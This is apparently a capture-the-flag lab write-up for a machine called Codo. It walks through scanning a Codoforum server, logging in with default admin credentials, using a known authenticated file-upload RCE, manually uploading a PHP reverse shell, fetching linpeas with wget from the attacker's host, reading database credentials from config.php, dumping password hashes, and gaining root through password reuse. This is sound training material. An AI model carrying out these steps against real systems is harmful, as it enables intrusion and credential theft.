# Codo

## Initial access

Run `autorecon` to enumerate open ports and services:

```
sudo autorecon 192.168.149.148
```

Open ports discovered:

- **22** — SSH (OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0))
- **80** — HTTP (Apache httpd 2.4.41 ((Ubuntu)))
  - Additional webpages:
    - `http://192.168.112.23/admin/`
    - `http://192.168.112.23/cache/`
    - `http://192.168.112.23/sites/`
    - `http://192.168.112.23/sys/`
  - Nikto finding:
    ```
    + [007302] /README.md: Readme Found.
    ```
    - `http://192.168.112.23/README.md`

Explore `http://192.168.112.23/README.md`, which reveals the software version:

```
Changelog
--


 [5.2]
   - Allow user to select theme as part of user preference
   - Add user activity logs in backend
...
```

The current version of some software is 5.2.

Explore the homepage at `http://192.168.112.23/`. The site is powered by Codoforum and contains a post stating: `The only user available to login in the front-end is admin with the password that you set during the installation.` This indicates the login username is `admin`.

Navigate to `http://192.168.112.23/admin/` and log in with the default credentials `admin:admin`. The admin dashboard at `http://192.168.112.23/admin/index.php` confirms the installed version is **V.5.1.105**.

Search for known vulnerabilities against Codoforum:

```
searchsploit codoforum
----------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                     |  Path
----------------------------------------------------------------------------------- ---------------------------------
CodoForum 2.5.1 - Arbitrary File Download                                          | php/webapps/36320.txt
CodoForum 3.2.1 - SQL Injection                                                    | php/webapps/40150.txt
CodoForum 3.3.1 - Multiple SQL Injections                                          | php/webapps/37820.txt
CodoForum 3.4 - Persistent Cross-Site Scripting                                    | php/webapps/40015.txt
Codoforum 4.8.3 - 'input_txt' Persistent Cross-Site Scripting                      | php/webapps/47886.txt
Codoforum 4.8.3 - Persistent Cross-Site Scripting                                  | php/webapps/47876.txt
CodoForum v5.1 - Remote Code Execution (RCE)                                       | php/webapps/50978.py
----------------------------------------------------------------------------------- ---------------------------------
```

The authenticated RCE exploit (CVE-2022-31854) targets CodoForum v5.1's arbitrary file upload vulnerability. Download and modify it to remove proxy-related code:

```
diff 50978.py 50978_modified.py
39,40d38
< proxy = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}
<
71c69
<     auth = session.post(loginURL, headers=send_headers, cookies=send_cookies, data=send_creds, proxies=proxy)
---
>     auth = session.post(loginURL, headers=send_headers, cookies=send_cookies, data=send_creds)
80c78
<     exploit = requests.post(globalSettings, headers=send_headers, cookies=send_cookies, data=send_payload, proxies=proxy)
---
>     exploit = requests.post(globalSettings, headers=send_headers, cookies=send_cookies, data=send_payload)
83c81
<     payloadExec = session.get(payloadURL + randomFileName + '.php', proxies=proxy)
---
>     payloadExec = session.get(payloadURL + randomFileName + '.php')
```

Run the modified exploit script:

```
CODOFORUM V5.1 ARBITRARY FILE UPLOAD TO RCE(Authenticated)

  ______     _______     ____   ___ ____  ____      _____ _  ___ ____  _  _
 / ___\ \   / / ____|   |___ \ / _ \___ \|___ \    |___ // |( _ ) ___|| || |
| |    \ \ / /|  _| _____ __) | | | |__) | __) |____ |_ \| |/ _ \___ \| || |_
| |___  \ V / | |__|_____/ __/| |_| / __/ / __/_____|__) | | (_) |__) |__   _|
 \____|  \_/  |_____|   |_____|\___/_____|_____|   |____/|_|\___/____/   |_|


Exploit found and written by: @vikaran101

[+] Login successful
[*] Checking webshell status and executing...
[-] Something went wrong, please try uploading the shell manually(admin panel > global settings > change forum logo > upload and access from http://192.168.112.23/sites/default/assets/img/attachments/[file.php])
```

The automated reverse shell upload failed. Upload a PHP reverse shell manually through the admin panel: navigate to **Admin Panel → Global Settings**, then upload the PHP reverse shell as the forum logo. Access the uploaded shell at `http://192.168.112.23/sites/default/assets/img/attachments/reverse_shell.php` and catch the connection with `penelope`.

```
www-data@codo:/$ whoami
www-data
```

There is no `local.txt` flag on this machine.

## Privilege escalation

Upload `linpeas.sh` to the target. On the attacking machine, start a Python HTTP server:

```
# Host
python3 -m http.server 9001

ip a
inet 192.168.45.189/24

# Target
www-data@codo:/$ cd /tmp
www-data@codo:/tmp$ which wget
/usr/bin/wget

www-data@codo:/tmp$ wget http://192.168.45.189:9001/linux/enum/linpeas.sh
```

Run `linpeas.sh` to enumerate privilege escalation vectors:

```
www-data@codo:/tmp$ chmod +x linpeas.sh
www-data@codo:/tmp$ ./linpeas.sh
```

Important findings:

```
══╣ Polkit Binary (T1548.003,T1068)
Pkexec binary found at: /usr/bin/pkexec
Pkexec binary has SUID bit set!
-rwsr-xr-x 1 root root 31032 Feb 21  2022 /usr/bin/pkexec
pkexec version 0.105
CVE-2021-4034 candidate: root-owned SUID pkexec with older upstream version; verify distro package fixes and mitigations
...
╔══════════╣ Active Ports (T1049)
╚ https://book.hacktricks.wiki/en/linux-hardening/network-information/local-network-and-socket-triage.html#loopback-and-local-service-enumeration
══╣ Active Ports (ss) (T1049)
tcp    LISTEN  0       511            0.0.0.0:80          0.0.0.0:*
tcp    LISTEN  0       4096     127.0.0.53%lo:53          0.0.0.0:*
tcp    LISTEN  0       128            0.0.0.0:22          0.0.0.0:*
tcp    LISTEN  0       80           127.0.0.1:3306        0.0.0.0:*
tcp    LISTEN  0       128               [::]:22             [::]:*
...
╔══════════╣ Searching passwords in PHP files (T1552.001)
/var/www/html/admin/login.php:            <input type="password" id="password" class="span4" name="password" placeholder="Password" />
/var/www/html/admin/modules/login.php:    $login->password = $_POST['password'];
/var/www/html/sites/default/config.php:  'password' => 'FatPanda123',
```

The pwnkit exploit (CVE-2021-4034) was attempted but did not work.

Linpeas found database credentials in `/var/www/html/sites/default/config.php`. Read the configuration file to extract the MySQL credentials:

```
www-data@codo:/tmp$ cat /var/www/html/sites/default/config.php
...
function get_codo_db_conf() {


    $config = array (
  'driver' => 'mysql',
  'host' => 'localhost',
  'database' => 'codoforumdb',
  'username' => 'codo',
  'password' => 'FatPanda123',
  'prefix' => '',
  'charset' => 'utf8',
  'collation' => 'utf8_unicode_ci',
);

    return $config;
}
...
```

The database credentials are `codo:FatPanda123`. Connect to the MariaDB database and enumerate the tables:

```
www-data@codo:/tmp$ mysql -u codo -p'FatPanda123'

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| codoforumdb        |
| information_schema |
+--------------------+

MariaDB [(none)]> show tables from codoforumdb;
+-------------------------+
| Tables_in_codoforumdb   |
+-------------------------+
| b8_wordlist             |
| codo_attachments        |
| codo_badges             |
| codo_bans               |
| codo_block_roles        |
| codo_blocks             |
| codo_categories         |
| codo_config             |
| codo_crons              |
| codo_daily_rep_log      |
| codo_edits              |
| codo_fields             |
| codo_fields_roles       |
| codo_fields_values      |
| codo_import_data        |
| codo_logs               |
| codo_mail_queue         |
| codo_notify             |
| codo_notify_queue       |
| codo_notify_subscribers |
| codo_notify_text        |
| codo_page_roles         |
| codo_pages              |
| codo_permission_list    |
| codo_permissions        |
| codo_plugins            |
| codo_poll_log           |
| codo_poll_options       |
| codo_poll_questions     |
| codo_posts              |
| codo_promotion_rules    |
| codo_report_types       |
| codo_reports            |
| codo_reputation         |
| codo_roles              |
| codo_sessions           |
| codo_signups            |
| codo_smileys            |
| codo_tags               |
| codo_tags_allowed       |
| codo_topics             |
| codo_unread_categories  |
| codo_unread_topics      |
| codo_user_badges        |
| codo_user_preferences   |
| codo_user_roles         |
| codo_users              |
| codo_views              |
+-------------------------+

MariaDB [(none)]> select * from codoforumdb.codo_users;
+----+-----------+-----------+--------------------------------------------------------------+-------+---------------------+------------+-------------+-----------+-------------+-------------------+-----------+----------+---------------+----------+------------+-----------------------------+
| id | username  | name      | pass                                                         | token | mail                | created    | last_access | read_time | user_status | avatar            | signature | no_posts | profile_views | oauth_id | reputation | last_notification_view_time |
+----+-----------+-----------+--------------------------------------------------------------+-------+---------------------+------------+-------------+-----------+-------------+-------------------+-----------+----------+---------------+----------+------------+-----------------------------+
|  1 | admin     | admin     | $2a$08$NxmF1vhrsnMypsJ1fJkR5OyxtBLWDChyHS4sAT.6ue6SyR2rbmFvS | NULL  | admin@codo.pg       | 1662010038 |  1794629178 |         0 |           1 | 6488ee7e82484.png |           |        1 |             3 | 0        |          0 |                           0 |
|  2 | anonymous | Anonymous | youJustCantCrackThis                                         |       | anonymous@localhost | 1662010038 |  1662010038 |         0 |           0 |                   |           |        0 |             0 | 0        |          0 |                           0 |
+----+-----------+-----------+--------------------------------------------------------------+-------+---------------------+------------+-------------+-----------+-------------+-------------------+-----------+----------+---------------+----------+------------+-----------------------------+
```

The `codo_users` table contains two entries. The `anonymous` user has a plaintext password `youJustCantCrackThis`, while the `admin` user has a bcrypt hash.

List the users on the target machine:

```
www-data@codo:/tmp$ ls -al /home
total 12
drwxr-xr-x  3 root   root   4096 Jun  9  2023 .
drwxr-xr-x 19 root   root   4096 Jun 15  2022 ..
drwxr-xr-x  3 offsec offsec 4096 Jun  9  2023 offsec
```

Attempt to pivot into the `offsec` user with the discovered passwords:

```
www-data@codo:/tmp$ su offsec
Password: youJustCantCrackThis
su: Authentication failure

www-data@codo:/tmp$ su offsec
Password: FatPanda123
su: Authentication failure
```

Both passwords fail for the `offsec` user. Try password reuse for the `root` account instead:

```
www-data@codo:/tmp$ su root
Password: FatPanda123

root@codo:/tmp# whoami
root
```

The database password `FatPanda123` is reused by the `root` account. Gain a root shell and retrieve the `proof.txt` flag:

```
root@codo:/tmp# cd /root
root@codo:~# cat proof.txt
a3f8b312eeb6ca9472591f8b16a81a13
```